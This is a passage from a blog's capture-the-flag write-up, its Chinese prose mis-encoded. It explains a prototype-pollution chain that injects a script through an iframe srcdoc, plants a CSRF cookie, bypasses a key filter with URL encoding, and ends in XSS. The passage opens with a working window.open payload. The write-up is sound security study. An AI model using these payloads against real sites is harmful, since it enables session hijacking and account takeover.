</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">URL_1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/?__proto%5f_.srcdoc[]=&lt;script\u003edocument.cookie=&#39;_csrf=nyxmare; Path=/login; Domain=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">root_domain</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;\u003c/script\u003e`</span>)
</span></span></code></pre></div><p>åœ¨å‰ç«¯<code>frontend.magic.world</code>ä¸­</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> {<span style="color:#a6e22e">q</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">parseParams</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>).<span style="color:#a6e22e">attr</span>({ <span style="color:#a6e22e">src</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">BASE_URL</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">q</span>,...})
</span></span></code></pre></div><p>è§£æå½“å‰<code>url</code>åä½¿ç”¨<code>jquery</code>çš„<code>attr()</code>æ–¹æ³•ç»™é€‰æ‹©çš„<code>iframe</code>å±æ€§èµ‹å€¼ï¼Œåœ¨<code>parseParams</code>å‡½æ•°ä¸­</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">re</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/([^&amp;=]+)=?([^&amp;]*)/g</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> {},
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;?&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;?&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">length</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">return</span> {};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">query</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#66d9ef">return</span> {};
</span></span><span style="display:flex;"><span><span style="color:#75715e">// execute a createElement on every key and value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">while</span> ((<span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">re</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#a6e22e">query</span>))) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">decode</span>(<span style="color:#a6e22e">sanitize</span>(<span style="color:#a6e22e">e</span>[<span style="color:#ae81ff">1</span>]));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">decode</span>(<span style="color:#a6e22e">e</span>[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">createElement</span>(<span style="color:#a6e22e">params</span>, <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>è¿™é‡Œä¼šå°†è¯·æ±‚çš„å‚æ•°ç”±<code>=</code>åˆ†å‰²ä¸º<code>key</code>ï¼Œ<code>value</code>ã€‚å…¶ä¸­å¯¹<code>key</code>è¿›è¡Œæ£€æµ‹ï¼Œæ˜¯å¦å­˜åœ¨<code>__proto__</code>ç­‰ç±»ä¼¼å­—ç¬¦ï¼Œå› ä¸ºå¤–å±‚ä½¿ç”¨<code>decode</code>è¿›è¡Œäº†ä¸€æ¬¡urlè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨urlç¼–ç ç»•è¿‡è¿™ä¸€ä¸ªæ£€æµ‹ï¼Œç„¶åå°†ç©ºå¯¹è±¡å’Œkeyï¼Œvalueä½œä¸ºå‚æ•°ä¼ å…¥<code>createElement</code>å‡½æ•°ã€‚ç¬¬ä¸€æ¬¡è¿›å…¥<code>createElement</code>å‡½æ•°æ—¶ï¼Œæ£€æµ‹åˆ°<code>.</code>è¿›å…¥ifçš„ç¬¬ä¸€ä¸ªåˆ†æ”¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">list</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;.&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">new_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">/\.(.+)?/</span>)[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">0</span>]]) <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">new_key</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">createElement</span>(<span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">0</span>]], <span style="color:#a6e22e">new_key</span>, <span style="color:#a6e22e">value</span>);	
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å¦‚æœè¿™é‡Œçš„<code>list[0]</code>ä¸º<code>__proto__</code>å±æ€§ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å°±å¯ä»¥æ±¡æŸ“ä¸€ä¸ªç©ºå¯¹è±¡çš„<code>prototype</code>å±æ€§ï¼Œç„¶åå†ç»è¿‡ä¸€æ¬¡<code>createElement</code>ï¼Œè¿™æ¬¡æˆ‘ä»¬éœ€è¦ç»è¿‡çš„æ˜¯ç¬¬äºŒä¸ªåˆ†æ”¯</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">list</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;[&#34;</span>);      <span style="color:#75715e">// key = srcdoc[]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">0</span>];                  <span style="color:#75715e">// key = srcdoc
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">list</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;]&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">index</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>) <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>])) <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>].<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>è¿™é‡Œå°±æ±¡æŸ“äº†æˆåŠŸäº†<code>Object</code>çš„<code>prototype</code>ï¼Œä¸ºä»€ä¹ˆåœ¨è¿™é‡Œè¦ä½¿ç”¨æ•°ç»„å‘¢ï¼Œä½¿ç”¨stringè¿›å…¥ç¬¬ä¸‰åˆ†æ”¯ä¹Ÿèƒ½æ±¡æŸ“</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">f</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>) <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>])) <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>][parseInt(<span style="color:#a6e22e">index</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>;
</span></span></code></pre></div><p>å› ä¸ºåœ¨<code>.attr()</code>ä¸­ï¼Œinå…³é”®å­—æ— æ³•å¯¹å­—ç¬¦ä¸²ä½¿ç”¨</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232320914.png" alt="image-20230123232001852"></p>
<p>å®Œæˆæ±¡æŸ“åï¼Œä¼šå¯¹<code>&lt;iframe&gt;</code>è®¾ç½®<code>srcdoc</code>å±æ€§ï¼Œä¸”ä¼˜å…ˆçº§é«˜äº<code>src</code></p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232245262.png" alt="image-20230123224540071"></p>
<p>æ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„jsï¼Œä¸ºä¹‹å‰çš„ç™»å½•è¯·æ±‚æ·»åŠ <code>Cookie</code>å±æ€§ç»•è¿‡<code>_csrf</code>çš„é™åˆ¶</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;_csrf=nyxmare; Path=/login; Domain=.magic.world&#39;</span>
</span></span></code></pre></div><p><code>bot</code>çš„<code>cookie</code>åŸŸåªåœ¨åç«¯åŸŸåï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨åç«¯ä¸­æ‰¾åˆ°ä¸€ä¸ªç‚¹ï¼Œå¯ä»¥è·³è½¬åˆ°æˆ‘ä»¬å‡†å¤‡å¥½çš„æ‰§è¡Œä¸Šé¢ä¸€ç³»åˆ—çš„htmlä¸­ã€‚åœ¨<code>index.js</code>ä¸­</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">q</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parseParams</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">q</span>.<span style="color:#a6e22e">message</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">welcome</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/isLoggedIn&#34;</span>, { <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;include&#34;</span> })).<span style="color:#a6e22e">json</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">welcome</span>.<span style="color:#a6e22e">path</span>) {
</span></span><span style="display:flex;"><span>	window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">welcome</span>.<span style="color:#a6e22e">path</span>
</span></span></code></pre></div><p>ä¸Šé¢çš„<code>parseParams</code>è·Ÿå‰ç«¯çš„ä¸€æ ·ï¼Œä¸å†èµ˜è¿°ï¼Œè¿™é‡Œéœ€è¦æ±¡æŸ“fetchçš„è¯·æ±‚æ–¹æ³•ï¼Œä½¿è¿”å›ç©ºï¼Œå› ä¸ºåç«¯åªå®šä¹‰äº†<code>GET</code>ï¼Œæ‰€ä»¥å®šä¹‰ä¸ºPOSTå³å¯ï¼Œç„¶åè·³è½¬åˆ°æˆ‘ä»¬å‡†å¤‡å¥½çš„payloadä¸­ï¼Œå°±å¼€å§‹æ±¡æŸ“<code>&lt;iframe&gt;</code>çš„<code>srcdoc</code>è®¾ç½®<code>/login</code>çš„<code>cookie</code>ï¼Œç„¶å<code>/login</code>ä¸Šä¼ æ³¨å†Œå¥½çš„å«<code>null byte</code>çš„ç”¨æˆ·å¯†ç å’Œ<code>_csrf</code>ç»•è¿‡<code>csrf</code>é™åˆ¶ï¼Œç™»å½•æˆåŠŸè·å¾—set-Cookieï¼Œè®¿é—®æˆ‘ä»¬ä¹‹å‰ä¸Šä¼ çš„å«<code>XSS``payload</code>çš„<code>txt</code>æ–‡ä»¶ï¼Œå°†å…¶åç¼€åæ”¹ä¸º<code>html</code>åæ‰§è¡Œ<code>XSS</code></p>
<p>å¤ªéš¾äº†è¿™é¢˜ï¼Œæ²¡æœ‰è‡ªå·±çš„æƒ³æ³•ï¼Œç­‰å¼ºç‚¹å†å›æ¥çœ‹çœ‹</p>

        </article>
    </div>
    <div class="giscus_comments"><script src="https://giscus.app/client.js"
        data-repo="an5er/an5er.github.io"
        data-repo-id="R_kgDOKnQBrQ"
        data-category="Announcements"
        data-category-id="DIC_kwDOKnQBrc4Cav6q"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="dark"
        data-lang="zh-CN"
        crossorigin="anonymous"
        async>
</script>
    </div>
    

            </div>
        </div><footer class="text-center pb-1">
</footer>
</body>
</html>
